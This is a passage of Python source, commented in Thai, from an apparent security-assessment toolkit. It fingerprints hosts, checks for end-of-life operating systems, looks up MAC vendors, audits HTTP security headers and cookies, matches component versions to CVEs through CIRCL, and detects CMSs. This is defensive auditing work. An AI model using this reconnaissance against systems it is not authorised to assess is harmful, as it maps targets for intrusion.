    linuxish = any(k in low for k in ("linux", "ubuntu", "debian", "centos", "rhel", "red hat",
                                      "alpine", "unix", "almalinux", "rocky", "amazon", "suse"))
    if windows and not linuxish:
        return {base["cve"]: {**base, "status": "n/a",
                "reason": "OS ที่ตรวจพบไม่ใช่ Linux (Windows) — ช่องโหว่เคอร์เนล Linux นี้จึงไม่เกี่ยวข้อง"}}
    src = fp.get("os_source", "") or "ไม่ทราบแหล่ง"
    conf = fp.get("os_confidence", "") or "ไม่ระบุ"
    if linuxish:
        hint = f"ตรวจพบสัญญาณว่าเป็น Linux ({src} · ความเชื่อมั่น {conf})"
    else:
        hint = "ยังระบุ OS จากภายนอกไม่ได้ชัดเจน — หากเป็น Linux kernel 4.4+ จะเข้าข่าย"
    return {base["cve"]: {**base, "status": "unknown",
            "reason": f"{hint}. เคอร์เนล 4.4+ เกือบทั้งหมดเข้าข่าย (CVSS 9.8) และ 'แพตช์แล้วหรือยัง' "
                      f"ตรวจจากภายนอกไม่ได้ ต้องเข้าไปตรวจ `uname -r` บนเครื่อง"}}


# OS/distro ที่หมดอายุ (EOL) — ตรวจ offline จาก os fingerprint (best-effort; ควรยืนยันบนเครื่อง)
# (regex ตรวจใน os text, label, เหตุผล, severity, status-bucket)
OS_EOL_RULES = [
    (r"\bcentos\b.*\b6\b|\bel6\b|rhel.*\b6\b", "CentOS/RHEL 6",
     "EOL ตั้งแต่ 2020 — ไม่มีแพตช์แล้ว เสี่ยงสูง", "High", "high-risk"),
    (r"\bcentos\b.*\b8\b|\bel8\b", "CentOS Linux 8",
     "CentOS 8 EOL ธ.ค. 2021 (ถ้าเป็น RHEL/Rocky/Alma 8 ยังรองรับ — ยืนยันบนเครื่อง)", "High", "medium-risk"),
    (r"\bcentos\b.*\b7\b|\bel7\b|rhel.*\b7\b", "CentOS/RHEL 7",
     "CentOS 7 EOL มิ.ย. 2024 (RHEL 7 เหลือ ELS แบบจ่ายเงิน) — ควรอัปเกรด", "High", "medium-risk"),
    (r"windows.*(server\s*)?2003|win\w*2003", "Windows Server 2003",
     "EOL 2015 — เสี่ยงสูงมาก", "Critical", "high-risk"),
    (r"windows.*(server\s*)?2008|win\w*2008", "Windows Server 2008/R2",
     "EOL ม.ค. 2020 — ควรอัปเกรดหรือใช้ ESU", "High", "high-risk"),
    (r"windows.*(server\s*)?2012|win\w*2012", "Windows Server 2012/R2",
     "EOL ต.ค. 2023 — ควรอัปเกรดหรือใช้ ESU", "High", "medium-risk"),
    (r"windows\s*xp|windows\s*vista|windows\s*7\b|windows\s*8(?!\.1)\b", "Windows เดสก์ท็อปรุ่นเก่า",
     "Windows XP/Vista/7/8 EOL — เสี่ยงสูง", "High", "high-risk"),
    (r"\bubuntu\b.*\b(1[02468]\.04|19\.\d+|21\.\d+|23\.\d+)\b", "Ubuntu รุ่นหมดอายุ",
     "Ubuntu รุ่นนี้หมดอายุ — ใช้ LTS ที่ยังรองรับ (22.04/24.04)", "Medium", "medium-risk"),
    (r"\b(wheezy|jessie|stretch|buster)\b|\bdebian\b.*\b([789]|10)\b", "Debian รุ่นเก่า",
     "Debian ≤10 หมดอายุ/ใกล้หมด — ตรวจและอัปเกรด", "Medium", "medium-risk"),
    (r"\bfreebsd\b.*\b(9|10|11)\b", "FreeBSD รุ่นเก่า",
     "FreeBSD ≤11 หมดอายุ — อัปเกรด", "Medium", "medium-risk"),
]


def _analyze_os_eol(fp):
    """ตรวจ OS/distro หมดอายุ (EOL) แบบ offline จาก os fingerprint — คืน {OS-EOL-*: finding}
    EOL = ไม่ได้รับแพตช์ความปลอดภัยอีก (เป็นความเสี่ยงในตัว ไม่ต้องรอ CVE เฉพาะ)"""
    txt = f"{fp.get('os', '')} {fp.get('os_source', '')} {fp.get('os_version', '')}".lower()
    for rx, label, reason, sev, status in OS_EOL_RULES:
        if re.search(rx, txt):
            key = "OS-EOL-" + re.sub(r"[^a-z0-9]+", "-", label.lower()).strip("-")
            return {key: {
                "cve": key, "name": f"ระบบปฏิบัติการหมดอายุ (EOL): {label}", "severity": sev,
                "trigger": f"ตรวจพบสัญญาณ {label} จาก OS fingerprint",
                "host_check": "ยืนยันด้วย `cat /etc/os-release` (Linux) หรือ winver (Windows) "
                              "แล้วอัปเกรดเป็นรุ่นที่ยังได้รับแพตช์ความปลอดภัย",
                "status": status,
                "reason": f"{reason} — OS ที่ EOL ไม่ได้รับแพตช์อีกต่อไป (ตรวจจากภายนอก ควรยืนยันบนเครื่อง)",
            }}
    return {}


# OUI offline (เฉพาะ prefix ที่มั่นใจสูง — ที่เหลือใช้ macvendors.com ออนไลน์เติม)
OUI_OFFLINE = {
    "001132": "Synology Incorporated", "0011d8": "ASUSTek",
    "b827eb": "Raspberry Pi Foundation", "dca632": "Raspberry Pi Trading",
    "e45f01": "Raspberry Pi Trading", "28cdc1": "Raspberry Pi Trading",
    "000c29": "VMware, Inc.", "005056": "VMware, Inc.", "001c14": "VMware, Inc.",
    "000569": "VMware, Inc.", "00155d": "Microsoft Corporation",
    "080027": "PCS Systemtechnik (VirtualBox)", "525400": "QEMU/KVM (QEMU virtual NIC)",
    "00089b": "QNAP Systems", "245ebe": "QNAP Systems",
    "00156d": "Ubiquiti Networks", "24a43c": "Ubiquiti Networks", "fcecda": "Ubiquiti Networks",
    "0c4242": "Ubiquiti Networks", "000c42": "MikroTik", "488f5a": "MikroTik",
    "64d154": "MikroTik", "cc2de0": "MikroTik", "dc2c6e": "MikroTik",
    "0040f4": "Cameo (CCTV)", "00408c": "Axis Communications", "accc8e": "Axis Communications",
    "c056e3": "Hikvision", "4419b6": "Hikvision", "bcad28": "Hikvision",
    "4cbd8f": "Hikvision", "2857be": "Hikvision", "a44319": "Hikvision",
    "3cef8c": "Dahua", "9002a9": "Dahua", "14a78b": "Dahua",
    "00090f": "Fortinet", "906cac": "Fortinet", "001b78": "Hewlett Packard",
    "3cd92b": "Hewlett Packard", "001422": "Dell Inc.", "b8ca3a": "Dell Inc.",
    "0090a9": "Western Digital", "001d0f": "TP-Link", "50c7bf": "TP-Link",
    "00095b": "Netgear", "20e52a": "Netgear",
}

# vendor (จากชื่อ) → (device_category, os_hint) — เดาแม่นจาก "ชื่อผู้ผลิต" ไม่พึ่ง prefix ที่เปราะ
VENDOR_PROFILE = [
    ("synology", "NAS", "Linux (Synology DSM)"),
    ("qnap", "NAS", "Linux (QNAP QTS)"),
    ("western digital", "NAS", "Linux (WD My Cloud)"),
    ("asustor", "NAS", "Linux (ADM)"),
    ("hikvision", "CCTV/Camera", "Embedded Linux (Hikvision)"),
    ("dahua", "CCTV/Camera", "Embedded Linux (Dahua)"),
    ("axis", "CCTV/Camera", "Embedded Linux (Axis)"),
    ("reolink", "CCTV/Camera", "Embedded Linux"),
    ("uniview", "CCTV/Camera", "Embedded Linux"),
    ("vivotek", "CCTV/Camera", "Embedded Linux"),
    ("cameo", "CCTV/Camera", "Embedded Linux"),
    ("ubiquiti", "Network", "Linux (UniFi/EdgeOS)"),
    ("mikrotik", "Network", "RouterOS (Linux)"),
    ("cisco", "Network", "Cisco IOS"),
    ("tp-link", "Network", ""), ("netgear", "Network", ""),
    ("zyxel", "Network", ""), ("draytek", "Network", ""), ("aruba", "Network", ""),
    ("fortinet", "Firewall", "FortiOS"), ("palo alto", "Firewall", "PAN-OS"),
    ("sophos", "Firewall", ""), ("watchguard", "Firewall", ""),
    ("apple", "Endpoint", "macOS / iOS"),
    ("raspberry pi", "SBC/IoT", "Linux (Raspberry Pi OS)"),
    ("vmware", "Virtual Machine", "Hypervisor guest (VMware)"),
    ("qemu", "Virtual Machine", "Linux/KVM guest"),
    ("virtualbox", "Virtual Machine", "VirtualBox guest"),
    ("pcs systemtechnik", "Virtual Machine", "VirtualBox guest"),
    ("microsoft", "Virtual Machine", "Windows / Hyper-V"),
    ("hewlett", "Server/Printer", ""), ("dell", "Server", ""),
    ("supermicro", "Server", ""), ("intel", "Endpoint/Server", ""),
    ("brother", "Printer", ""), ("canon", "Printer", ""), ("epson", "Printer", ""),
    ("ricoh", "Printer", ""), ("fuji xerox", "Printer", ""),
]


def _mac_vendor_lookup(mac, online=True):
    """OUI → ผู้ผลิต: ตารางออฟไลน์ก่อน (เร็ว/ไม่ต้องเน็ต) แล้วค่อย macvendors.com ถ้าอนุญาต"""
    if not mac:
        return ""
    pfx = mac.replace(":", "").lower()[:6]
    if pfx in OUI_OFFLINE:
        return OUI_OFFLINE[pfx]
    if online:
        try:
            vr = requests.get(f"https://api.macvendors.com/{mac}", timeout=6,
                              headers={"User-Agent": "rmut-cert-toolkit"})
            if vr.status_code == 200 and vr.text.strip():
                return vr.text.strip()[:60]
        except Exception:
            pass
    return ""


def _vendor_profile(vendor):
    """ชื่อผู้ผลิต → (device_category, os_hint) — ใช้เดาชนิดอุปกรณ์/OS เมื่อ HTTP เงียบ"""
    low = (vendor or "").lower()
    for sub, cat, os_hint in VENDOR_PROFILE:
        if sub in low:
            return cat, os_hint
    return "", ""


def _read_mac(ip):
    """อ่าน MAC ของ IP จาก ARP cache — ครอบคลุม macOS/Linux (arp -a, arp <ip>, ip neigh)
    ข้ามรายการ (incomplete); คืน MAC ปกติ (zero-padded, lowercase) หรือ '' """
    import subprocess
    _MAC_RE = re.compile(r"\b([0-9a-fA-F]{1,2}(?::[0-9a-fA-F]{1,2}){5})\b")
    cmds = [["arp", "-n", ip], ["arp", ip], ["arp", "-a"], ["ip", "neigh", "show", ip], ["ip", "neigh"]]
    for cmd in cmds:
        try:
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=3).stdout or ""
        except Exception:
            continue
        for line in out.splitlines():
            if ip not in line or "incomplete" in line.lower():
                continue
            m = _MAC_RE.search(line)
            if m and m.group(1).lower() not in ("00:00:00:00:00:00", "ff:ff:ff:ff:ff:ff"):
                return ":".join(x.zfill(2) for x in m.group(1).split(":")).lower()
    return ""


def _probe_mac(ip, fp, opts, lan=False):
    """ดึง MAC + ผู้ผลิต (OUI) + เดาอุปกรณ์/OS — ได้เฉพาะเป้าหมายในวง LAN เดียวกัน (IP ส่วนตัว)
    prime ARP ด้วย TCP connect (ไม่พึ่ง ICMP → ปิดปิงก็ยังได้ MAC); OUI ออฟไลน์ก่อน แล้วออนไลน์เติม"""
    import socket
    if not ip or _is_private_ip(ip) is not True:
        return  # นอกวง LAN → ARP ไม่ได้ MAC จริงของเป้าหมาย
    if not fp.get("mac"):            # nmap/discovery อาจเติมให้แล้ว
        fp["mac"] = _read_mac(ip)
    if not fp.get("mac"):            # ยังไม่มี → prime ARP ด้วย TCP touch แล้วอ่านซ้ำ
        for p in (80, 443, 8080, 22):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.6)
            try:
                s.connect_ex((ip, p))
            except Exception:
                pass
            finally:
                s.close()
        fp["mac"] = _read_mac(ip)
    if not fp.get("mac"):
        # เข้าถึงโฮสต์ได้แต่อ่าน MAC ไม่ได้ → บน macOS มักเป็นเพราะสิทธิ์ 'Local Network' ของ python/Terminal
        if sys.platform == "darwin":
            _lan_hint("mac", "  ⚠ MAC/อุปกรณ์: อ่านตาราง ARP ไม่ได้ (เชื่อมต่อ TCP ได้แต่ระบบซ่อนตาราง ARP) — "
                             "macOS ต้องอนุญาต 'Local Network' ให้ python/Terminal ที่ System Settings › "
                             "Privacy & Security › Local Network แล้วรันใหม่ จึงจะได้ MAC→ยี่ห้อ/อุปกรณ์")
        return
    # OUI → ผู้ผลิต (โหมด LAN เปิดเสมอ, นอกนั้นตาม opt-in online)
    if not fp.get("mac_vendor"):
        fp["mac_vendor"] = _mac_vendor_lookup(fp["mac"], online=(lan or opts.get("online_cve")))
    # เดาอุปกรณ์/OS จากผู้ผลิต — เติมเฉพาะช่องที่ HTTP fingerprint ยังเงียบ (ไม่ทับของที่ตรวจเจอจริง)
    cat, os_hint = _vendor_profile(fp.get("mac_vendor", ""))
    if cat and not fp.get("device"):
        fp["device"] = f"{fp['mac_vendor']} ({cat})"
        fp["device_category"] = cat
        fp["device_source"] = "MAC/OUI"
    if os_hint and fp.get("os", "Unknown") in ("", "Unknown"):
        fp["os"] = os_hint
        fp["os_source"] = "MAC vendor (เดาจากผู้ผลิต)"
        fp["os_confidence"] = "ปานกลาง (อนุมานจาก OUI)"


def _audit_security_headers(fp, base):
    """ตรวจ HTTP security headers ที่ขาด/อ่อน จาก fp['headers'] (ไม่ยิง request เพิ่ม)
    คืน {HEADER-*: finding} — รวมเป็นรายการเดียวเพื่อไม่ให้ท่วมรายงาน + แยกเคส cookie"""
    out = {}
    if not fp.get("reachable"):
        return out
    H = fp.get("headers", {}) or {}
    is_https = base.startswith("https://")

    def has(name):
        return bool(H.get(name.lower()))

    missing = []  # (ชื่อ header, ระดับ 'medium'|'low', คำอธิบาย)
    if is_https and not has("strict-transport-security"):
        missing.append(("Strict-Transport-Security (HSTS)", "medium", "บังคับ HTTPS กัน downgrade/MITM"))
    if not has("content-security-policy"):
        missing.append(("Content-Security-Policy (CSP)", "medium", "ลดความเสี่ยง XSS/injection"))
    csp = " ".join(H.get("content-security-policy", [])).lower()
    if not has("x-frame-options") and "frame-ancestors" not in csp:
        missing.append(("X-Frame-Options", "medium", "กัน clickjacking (หรือใช้ CSP frame-ancestors)"))
    if "nosniff" not in " ".join(H.get("x-content-type-options", [])).lower():
        missing.append(("X-Content-Type-Options: nosniff", "low", "กัน MIME sniffing"))
    if not has("referrer-policy"):
        missing.append(("Referrer-Policy", "low", "คุมการรั่วของ Referer"))
    if not has("permissions-policy"):
        missing.append(("Permissions-Policy", "low", "จำกัดฟีเจอร์เบราว์เซอร์ที่ไม่ใช้"))

    if missing:
        has_medium = any(w == "medium" for _, w, _ in missing)
        names = "; ".join(f"{n} ({note})" for n, _, note in missing)
        out["HEADER-SecurityHeaders"] = {
            "cve": "HEADER-SecurityHeaders",
            "name": f"Security headers ขาด/อ่อน ({len(missing)} รายการ)",
            "severity": "Medium" if has_medium else "Low",
            "trigger": "ตรวจ HTTP response headers",
            "host_check": "เพิ่ม security headers ที่ web server (nginx: add_header ...; Apache: Header set ...)",
            "status": "medium-risk" if has_medium else "unknown",
            "reason": f"ขาด/ไม่ได้ตั้งค่า: {names}",
        }

    sc = " ".join(H.get("set-cookie", []))
    if sc:
        sc_low = sc.lower()
        issues = []
        if is_https and "secure" not in sc_low:
            issues.append("ไม่มี Secure")
        if "httponly" not in sc_low:
            issues.append("ไม่มี HttpOnly")
        if "samesite" not in sc_low:
            issues.append("ไม่มี SameSite")
        if issues:
            out["HEADER-Cookie"] = {
                "cve": "HEADER-Cookie", "name": "Cookie ขาด flag ความปลอดภัย",
                "severity": "Medium", "trigger": "ตรวจ Set-Cookie",
                "host_check": "ตั้ง Secure; HttpOnly; SameSite=Lax/Strict บนคุกกี้ session",
                "status": "medium-risk",
                "reason": f"คุกกี้: {', '.join(issues)} — เสี่ยงถูกขโมยผ่าน XSS/ส่งข้ามไซต์",
            }
    return out


def _stack_profile(fp, cms_info):
    """สรุปสแตกเป็นชั้น ๆ สำหรับแสดงผล: OS → device → server → container → runtime → app"""
    layers = []
    if fp.get("waf"):
        layers.append(f"WAF: {fp['waf']}")
    if fp.get("cdn_proxy") and fp.get("cdn_proxy") != fp.get("waf"):
        layers.append(f"CDN: {fp['cdn_proxy']}")
    if fp.get("device"):
        layers.append(f"{fp['device']}" + (f" {fp['device_version']}" if fp.get("device_version") else ""))
    osv = fp.get("os_version") or (fp.get("os") if fp.get("os") != "Unknown" else "")
    if osv:
        layers.append(f"OS: {osv}")
    if fp.get("server_family") and fp["server_family"] != "Unknown":
        layers.append(f"{fp['server_family']}" + (f"/{fp['server_version']}" if fp.get("server_version") else ""))
    for eng in fp.get("engine_hints", []):
        layers.append(f"engine: {eng}")
    for layer in fp.get("container_layers", []):
        layers.append(layer)
    if fp.get("php_versions"):
        layers.append("PHP/" + ", ".join(sorted(fp["php_versions"])))
    elif fp.get("php_detected"):
        layers.append("PHP (เวอร์ชันไม่เปิดเผย)")
    for fw in fp.get("nodejs_frameworks", []):
        layers.append(fw)
    app = (cms_info or {}).get("app") or {}
    if app.get("product") and app.get("version_str"):
        layers.append(f"{app['product']} {app['version_str']}")
    elif (cms_info or {}).get("cms"):
        layers.append(cms_info["cms"])
    if app.get("plugins"):
        layers.append(f"+{len(app['plugins'])} WP plugin")
    for comp in fp.get("components", []):
        if comp["type"] in ("Database", "Tool"):
            layers.append(f"{comp['name']}" + (f" {comp['version']}" if comp.get("version") else ""))
    return layers


# ═══════════════════════════════════════════════════════════════════════
# Online CVE enrichment (opt-in, hybrid) — ค้น CVE สดจาก CIRCL cve-search
# (ฟรี ไม่ต้อง API key) เทียบช่วงเวอร์ชันของ "ทุกชั้น" ที่ fingerprint ดึงมาได้
# Wordfence feed เดิมถูกปิด (HTTP 410) จึงใช้ CIRCL เป็นหลัก; plugin = best-effort
# ═══════════════════════════════════════════════════════════════════════
# component → (vendor, product) ตาม CPE ของ CIRCL/NVD
CIRCL_MAP = {
    "WordPress": ("wordpress", "wordpress"),
    "Drupal": ("drupal", "drupal"),
    "Joomla": ("joomla", "joomla"),
    "Nextcloud": ("nextcloud", "nextcloud"),
    "Moodle": ("moodle", "moodle"),
    "PHP": ("php", "php"),
    "NGINX": ("nginx", "nginx"),
    "Apache": ("apache", "http_server"),
    "IIS": ("microsoft", "internet_information_services"),
    "LiteSpeed": ("litespeedtech", "litespeed_web_server"),
    "OpenSSL": ("openssl", "openssl"),
    "Synology DSM": ("synology", "diskstation_manager"),
    "QNAP QTS": ("qnap", "qts"),
    "pfSense": ("netgate", "pfsense"),
    "MikroTik RouterOS": ("mikrotik", "routeros"),
    # control panel โอเพนซอร์ส (ตามชื่อ product ใน NVD)
    "HestiaCP": ("hestiacp", "hestiacp"),
    "VestaCP": ("vestacp", "vesta_control_panel"),
    "CyberPanel": ("cyberpanel", "cyberpanel"),
    "ISPConfig": ("ispconfig", "ispconfig"),
    "Froxlor": ("froxlor", "froxlor"),
    "Ajenti": ("ajenti", "ajenti"),
    "CentOS Web Panel": ("control-webpanel", "webpanel"),
    "Webmin": ("webmin", "webmin"),
    "Virtualmin": ("virtualmin", "virtualmin"),
    # ส่วนประกอบอื่น ๆ (DB / JS libs / tools)
    "MySQL/MariaDB": ("oracle", "mysql"),
    "MariaDB": ("mariadb", "mariadb"),
    "PostgreSQL": ("postgresql", "postgresql"),
    "jQuery": ("jquery", "jquery"),
    "Bootstrap": ("getbootstrap", "bootstrap"),
    "Vue": ("vuejs", "vue"),
    "AngularJS": ("angularjs", "angular.js"),
    "Lodash": ("lodash", "lodash"),
    "phpMyAdmin": ("phpmyadmin", "phpmyadmin"),
    "Adminer": ("adminer", "adminer"),
    "Jenkins": ("jenkins", "jenkins"),
    "Grafana": ("grafana", "grafana"),
}
_ONLINE_CVE_CACHE = {}  # memo per (vendor, product) ภายใน process เพื่อไม่ยิงซ้ำ


def _parse_ver(s):
    """'8.1.0' / '22.2.10.33' / '1.1.1f' → tuple ของเลขจำนวนเต็ม (ตัดอักษรท้ายทิ้ง); None ถ้าไม่มีเลข"""
    if isinstance(s, (tuple, list)):
        return tuple(int(x) for x in s) if s else None
    parts = re.findall(r"\d+", str(s or ""))
    return tuple(int(x) for x in parts) if parts else None


def _vcmp(a, b):
    """เทียบ version tuple แบบ pad ศูนย์ → -1 / 0 / 1"""
    n = max(len(a), len(b))
    a = tuple(a) + (0,) * (n - len(a))
    b = tuple(b) + (0,) * (n - len(b))
    return (a > b) - (a < b)


def _ocve_text_range(vt, raw):
    """เทียบ vt กับช่วงเวอร์ชันที่เขียนเป็นข้อความอิสระใน field `version`
    เช่น '>= 1.12.0, < 3.5.0', 'All versions prior to version 1.9.0', 'before 2.0' """
    low = (raw or "").lower().strip()
    bounds = []  # (op, version_tuple)
    for pat, op in ((r"prior to(?:\s+version)?\s*v?([\d.]+)", "lt"),
                    (r"before\s*v?([\d.]+)", "lt"),
                    (r"up to and including\s*v?([\d.]+)", "le"),
                    (r"up to\s*v?([\d.]+)", "lt"),
                    (r"through\s*v?([\d.]+)", "le")):
        mm = re.search(pat, low)
        if mm:
            bounds.append((op, _parse_ver(mm.group(1))))
    for mm in re.finditer(r"(>=|<=|>|<|=)\s*v?([\d.]+)", low):
        op = {">=": "ge", "<=": "le", ">": "gt", "<": "lt", "=": "eq"}[mm.group(1)]
        bounds.append((op, _parse_ver(mm.group(2))))
    if not bounds:
        # ข้อความเป็นเลขเวอร์ชันเดี่ยว ๆ → ตีความว่ากระทบเฉพาะรุ่นนั้น
        if re.fullmatch(r"v?[\d.]+", low):
            bv = _parse_ver(low)
            if bv:
                bounds.append(("eq", bv))
    if not bounds:
        return False
    for op, bt in bounds:
        if not bt:
            return False
        c = _vcmp(vt, bt)
        if (op == "ge" and c < 0) or (op == "gt" and c <= 0) or \
           (op == "le" and c > 0) or (op == "lt" and c >= 0) or (op == "eq" and c != 0):
            return False
    return True


def _ocve_in_affected(vt, versions):
    """vt อยู่ในช่วงกระทบของ affected[].versions — รองรับทั้งรูปแบบ structured
    (version/lessThan/lessThanOrEqual) และช่วงเวอร์ชันที่เขียนเป็นข้อความอิสระใน version"""
    for v in versions or []:
        if (v.get("status") or "affected") != "affected":
            continue
        raw = (v.get("version") or "").strip()
        lt = _parse_ver(v.get("lessThan")) if v.get("lessThan") else None
        lte = _parse_ver(v.get("lessThanOrEqual")) if v.get("lessThanOrEqual") else None
        if lt is not None or lte is not None:
            lo = _parse_ver(raw) if raw not in ("", "0", "*") else None
            ok_lo = (lo is None) or _vcmp(vt, lo) >= 0
            ok_hi = (lt is not None and _vcmp(vt, lt) < 0) or (lte is not None and _vcmp(vt, lte) <= 0)
            if ok_lo and ok_hi:
                return True
            continue
        # ไม่มี field structured → ลองตีความช่วงจากข้อความใน version
        if raw and _ocve_text_range(vt, raw):
            return True
    return False


def _circl_cvss(rec):
    """ดึง CVSS สูงสุด + severity จาก containers.cna/adp.metrics — คืน (score|None, 'Critical'|...)"""
    best, sev = 0.0, ""
    conts = rec.get("containers") or {}
    blocks = [conts.get("cna") or {}] + list(conts.get("adp") or [])
    for blk in blocks:
        for mt in blk.get("metrics") or []:
            for k in ("cvssV4_0", "cvssV3_1", "cvssV3_0", "cvssV2_0"):
                cv = mt.get(k)
                if cv and cv.get("baseScore") is not None and cv["baseScore"] >= best:
                    best = cv["baseScore"]
                    sev = (cv.get("baseSeverity") or "").title()
    return (best or None), sev


def _circl_cves(vendor, product, vt, timeout=12, cap=8):
    """คืน list ของ finding (ONLINE-<CVE>) จาก CIRCL ที่กระทบเวอร์ชัน vt"""
    out = []
    if not vt:
        return out
    key = (vendor, product)
    if key in _ONLINE_CVE_CACHE:
        records = _ONLINE_CVE_CACHE[key]
    else:
        records = None
        try:
            r = requests.get(f"https://cve.circl.lu/api/search/{vendor}/{product}",
                             timeout=timeout,
                             headers={"Accept": "application/json", "User-Agent": "rmut-cert-toolkit"})
            if r.status_code == 200:
                records = ((r.json() or {}).get("results") or {}).get("nvd") or []
        except Exception:
            records = None
        _ONLINE_CVE_CACHE[key] = records
    if not records:
        return out
    for item in records:
        try:
            cid, rec = item[0], item[1]
        except Exception:
            continue
        cna = (rec.get("containers") or {}).get("cna") or {}
        if not any(_ocve_in_affected(vt, aff.get("versions")) for aff in (cna.get("affected") or [])):
            continue
        score, sev = _circl_cvss(rec)
        desc = ""
        for d in cna.get("descriptions") or []:
            if (d.get("lang") or "").lower().startswith("en"):
                desc = d.get("value", ""); break
        cid_u = cid.upper()
        out.append({
            "cve": f"ONLINE-{cid_u}", "_real_cve": cid_u,
            "name": f"{cid_u} — {product}",
            "severity": sev or "Medium",
            "trigger": "online CVE lookup (CIRCL) เทียบช่วงเวอร์ชัน",
            "host_check": f"อัปเดต {product} ให้เป็นรุ่นที่แก้แล้ว (ดู advisory ของ {cid_u})",
            "status": "vulnerable-version",
            "reason": (f"{product} {'.'.join(map(str, vt))} อยู่ในช่วงกระทบของ {cid_u}"
                       + (f" (CVSS {score})" if score else "")
                       + (f" — {desc[:180]}" if desc else "")),
            "_score": score or 0.0,
        })
    out.sort(key=lambda x: x.get("_score", 0.0), reverse=True)
    return out[:cap]


def _online_cve_scan(fp, cms_info, opts):
    """ค้น CVE ออนไลน์สำหรับทุกชั้นที่ตรวจพบ (opt-in) — คืน {ONLINE-<cve>: finding}"""
    if not opts.get("online_cve"):
        return {}
    out = {}
    comps = []  # (ชื่อสำหรับแมป, version_tuple)
    for pv in fp.get("php_versions", []):
        comps.append(("PHP", _parse_ver(pv)))
    if fp.get("server_family") == "NGINX" and fp.get("nginx_version"):
        comps.append(("NGINX", _parse_ver(fp["nginx_version"])))
    elif fp.get("server_family") == "Apache" and fp.get("server_version"):
        comps.append(("Apache", _parse_ver(fp["server_version"])))
    elif fp.get("server_family") == "IIS" and fp.get("server_version"):
        comps.append(("IIS", _parse_ver(fp["server_version"])))
    elif fp.get("server_family") == "LiteSpeed" and fp.get("server_version"):
        comps.append(("LiteSpeed", _parse_ver(fp["server_version"])))
    if (fp.get("modules") or {}).get("OpenSSL"):
        comps.append(("OpenSSL", _parse_ver(fp["modules"]["OpenSSL"])))
    if fp.get("device") in CIRCL_MAP and fp.get("device_version"):
        comps.append((fp["device"], _parse_ver(fp["device_version"])))
    app = (cms_info or {}).get("app") or {}
    if app.get("product") in CIRCL_MAP and app.get("version"):
        comps.append((app["product"], app["version"]))
    # ส่วนประกอบอื่น ๆ ที่มีเวอร์ชัน (DB / JS libs / tools)
    for comp in fp.get("components", []):
        if comp.get("version") and comp.get("name") in CIRCL_MAP:
            comps.append((comp["name"], _parse_ver(comp["version"])))

    timeout = min(float(opts.get("timeout", 8.0)) + 5, 15)
    for name, vt in comps:
        mapping = CIRCL_MAP.get(name)
        if not mapping or not vt:
            continue
        for f in _circl_cves(mapping[0], mapping[1], vt, timeout=timeout):
            out.setdefault(f["cve"], f)

    # composer.lock packages (ถ้าเปิดเผย) — เวอร์ชันเป๊ะทุก dependency → เทียบ CVE
    # CPE ของ composer package ไม่สม่ำเสมอ จึงเป็น best-effort (บางตัว match เช่น laravel/symfony/phpmailer)
    for pkg in (fp.get("composer_packages") or [])[:40]:
        pvt = _parse_ver(pkg.get("version"))
        nm = pkg.get("name", "")
        if not pvt or "/" not in nm:
            continue
        vendor, _, product = nm.partition("/")
        for f in _circl_cves(vendor, product, pvt, timeout=timeout, cap=3):
            f = dict(f)
            f["name"] = f"{f['_real_cve']} — {nm}"
            f["reason"] = f"แพ็กเกจ {nm} {pkg['version']}: " + f["reason"]
            out.setdefault(f["cve"], f)

    # plugin (WordPress) — best-effort: ปลั๊กอินมี CPE ไม่สม่ำเสมอใน free source
    # จึงลองแบบ wordpress/<slug_underscore> และจำกัดจำนวน (กันยิงเยอะ/ช้า)
    for p in (app.get("plugins") or [])[:8]:
        pvt = _parse_ver(p.get("version"))
        if not pvt:
            continue
        slug_us = p["slug"].replace("-", "_")
        for f in _circl_cves("wordpress", slug_us, pvt, timeout=timeout, cap=3):
            out.setdefault(f["cve"], f)
    return out


def _detect_cms(session, base, prefix, timeout, all_urls):
    hits = {}
    for url in all_urls:
        for cms, pats in CMS_PATTERNS:
            if any(re.search(p, url) for p in pats):
                hits[cms] = hits.get(cms, 0) + 1
    root_html, meta_gen = "", ""
    try:
        r = session.get(base + prefix + "/", timeout=timeout)
        root_html = r.text or ""
        p = _LinkParser(); p.feed(root_html)
        meta_gen = p.meta_generator or ""
        mg_low = meta_gen.lower()
        if "wordpress" in mg_low:
            hits["WordPress"] = hits.get("WordPress", 0) + 1
        if "joomla" in mg_low:
            hits["Joomla"] = hits.get("Joomla", 0) + 1
        if "drupal" in mg_low:
            hits["Drupal"] = hits.get("Drupal", 0) + 1
        if "moodle" in mg_low:
            hits["Moodle"] = hits.get("Moodle", 0) + 2
        set_cookie = (r.headers.get("Set-Cookie") or "").lower()
        if "moodlesession" in set_cookie:
            hits["Moodle"] = hits.get("Moodle", 0) + 3
        if "yui_combo.php" in root_html or "/lib/javascript.php" in root_html or "theme/image.php" in root_html:
            hits["Moodle"] = hits.get("Moodle", 0) + 2
        if "_csrf" in set_cookie or "yii_csrf" in set_cookie or "_identity" in set_cookie or "r=site/login" in root_html:
            hits["Yii"] = hits.get("Yii", 0) + 2
        x_pow = (r.headers.get("X-Powered-By") or "").lower()
        if "slim" in x_pow:
            hits["Slim"] = hits.get("Slim", 0) + 3
    except requests.RequestException:
        pass
    cms = max(hits.items(), key=lambda x: x[1])[0] if hits else None
    app = _detect_app_versions(session, base, prefix, timeout, cms, root_html, meta_gen)
    # status.php อาจยืนยันว่าเป็น Nextcloud แม้ไม่เข้า CMS_PATTERNS
    if (not cms or cms != app.get("product")) and app.get("product") == "Nextcloud":
        cms = "Nextcloud"
    return {"cms": cms, "hits": hits, "app": app}


def _detect_session(session, base, prefix, endpoints, timeout):
    urls = [base + prefix + "/"] + [base + prefix + p for p in list(endpoints.keys())[:10]]
    for url in urls:
        try:
            r = session.get(url, timeout=timeout, allow_redirects=False)
            if "PHPSESSID" in r.headers.get("Set-Cookie", ""):
                return {"session_used": True, "evidence": [url]}
        except requests.RequestException:
            continue
    return {"session_used": False, "evidence": []}


def _crawl(session, base, prefix, max_depth, max_pages, timeout, verbose=False, crawl_budget=30, fp=None):
    start = base + prefix + "/"
    _t0 = time.time()
    origin = f"{urlparse(start).scheme}://{urlparse(start).netloc}"
    visited, queue = set(), [(start, 0)]
    endpoints, all_urls = {}, []
    baseline_hash, baseline_status = None, None

    def _enrich_fp(resp):
        if not fp or resp is None:
            return
        hdr_blob = f"{resp.headers.get('Server', '')} {resp.headers.get('X-Powered-By', '')} {resp.headers.get('Via', '')}"
        txt_head = (resp.text or "")[:15000]
